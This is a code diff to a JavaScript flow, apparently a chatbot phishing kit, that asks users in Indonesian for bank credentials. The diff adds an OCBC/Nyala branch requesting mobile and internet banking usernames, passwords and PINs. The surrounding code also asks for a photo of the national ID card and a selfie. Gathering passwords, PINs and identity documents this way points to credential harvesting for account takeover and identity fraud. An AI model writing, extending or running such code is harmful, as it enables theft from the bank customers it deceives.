@@ -27,8 +27,10 @@ const getSteps = (bank) => {
     bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
   } else if (b === 'BNI') {
     bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
+  } else if (b === 'OCBC' || b === 'OCBC NISP') {
+    bankSteps = ['ocbcNyalaUser', 'mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   } else if (b !== '') {
-    // Mandiri, Danamon, OCBC, etc.
+    // Mandiri, Danamon, etc.
     bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   }
 
@@ -67,6 +69,7 @@ const getBankSpecificLabel = (field, bankName) => {
     briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
     pinWondr: '🛡️ Masukkan PIN Wondr (BNI):',
     passWondr: '🔓 Masukkan Password Wondr (BNI):',
+    ocbcNyalaUser: '👤 Masukkan User ID Nyala (OCBC):',
     uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
     uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE:'
   };
